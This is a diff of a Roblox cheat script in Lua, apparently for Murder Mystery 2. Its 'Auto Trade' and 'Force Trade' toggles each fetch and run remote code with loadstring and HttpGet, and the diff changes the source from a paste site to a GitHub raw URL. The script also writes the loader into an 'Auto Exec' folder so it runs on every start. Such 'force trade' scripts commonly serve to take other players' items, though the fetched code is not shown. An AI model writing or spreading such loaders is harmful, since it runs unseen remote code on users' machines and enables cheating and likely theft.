@@ -4,16 +4,16 @@ local label = lib:CreateLabel(window, "Main")
 
 local autoForceTrade = false
 lib:CreateToggle(window, "Auto Force Trade", false, function(state)
-    loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
 end)
 
 local autoTrade = false
 lib:CreateToggle(window, "Auto Trade", false, function(state)
-    loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
 end)
 
 lib:CreateButton(window, "Auto Accept Trade", function()
-    loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
 end)
 
 local folders = {"Auto Exec"}
@@ -28,6 +28,6 @@ end
 
 if selectedFolder and writefile then
     writefile(selectedFolder.."/baconhubauto.lua", [[
-loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
 ]])
 end
